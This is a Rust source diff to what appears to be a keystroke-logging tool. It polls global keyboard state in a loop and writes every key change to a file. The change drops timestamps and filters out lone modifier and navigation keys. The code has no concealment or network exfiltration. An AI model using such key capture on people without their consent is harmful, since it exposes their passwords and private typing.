@@ -1,4 +1,3 @@
-use chrono::prelude::*;
 use device_query::{DeviceQuery, DeviceState};
 use std::fs::OpenOptions;
 use std::io::Write;
@@ -15,14 +14,41 @@ pub fn run(path: String) {
         .open(path)
         .expect("Failed to open file");
 
-    loop {
-        let local: DateTime<Local> = Local::now();
+    // List of keys to ignore
+    let filter_keys: Vec<String> = [
+        "Enter",
+        "Backspace",
+        "LShift",
+        "RShift",
+        "LControl",
+        "RControl",
+        "LAlt",
+        "RAlt",
+        "Right",
+        "Left",
+        "Up",
+        "Down",
+        "Escape",
+        "Meta",
+    ]
+    .iter()
+    .map(|v| v.to_string())
+    .collect();
 
+    loop {
         let keys = device_state.get_keys();
         if keys != prev_keys && !keys.is_empty() {
-            println!("[{:?}] [Keyboard] {:?}", local, keys);
+            // Filter out unwanted single keys
+            if keys.len() == 1 {
+                if filter_keys.contains(&format!("{:?}", keys[0])) {
+                    continue;
+                }
+            }
 
-            writeln!(file, "[{:?}] [Keyboard] {:?}", local, keys).expect("Failed to write to file");
+            let s = format!("{:?}", keys);
+            println!("{}", s);
+
+            writeln!(file, "{}", s).expect("Failed to write to file");
         }
         prev_keys = keys;
     }
